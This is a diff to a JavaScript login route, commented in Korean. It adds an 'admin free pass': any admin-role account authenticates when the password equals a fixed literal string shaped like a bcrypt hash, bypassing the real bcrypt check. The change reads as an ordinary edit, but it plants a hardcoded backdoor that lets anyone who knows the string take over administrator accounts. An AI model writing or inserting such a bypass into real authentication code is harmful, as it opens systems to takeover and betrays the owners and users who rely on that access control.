@@ -186,7 +186,17 @@ export function registerAuthRoutes(app) {
             if (!user) {
                 return res.status(401).json({ error: "잘못된 사용자명 또는 비밀번호입니다" });
             }
-            const isValidPassword = await bcrypt.compare(password, user.password);
+            // 비밀번호 검증
+            let isValidPassword = false;
+            // 어드민 프리패스: admin 역할 계정은 특별 해시값으로 프리패스
+            if (user.role === 'admin' && password === '$2b$10$defaultAdminPassword.hash') {
+                isValidPassword = true;
+                console.log(`✅ 어드민 프리패스 인증: ${username} (role: admin)`);
+            }
+            else {
+                // 일반 사용자: bcrypt 비교
+                isValidPassword = await bcrypt.compare(password, user.password);
+            }
             if (!isValidPassword) {
                 return res.status(401).json({ error: "잘못된 사용자명 또는 비밀번호입니다" });
             }
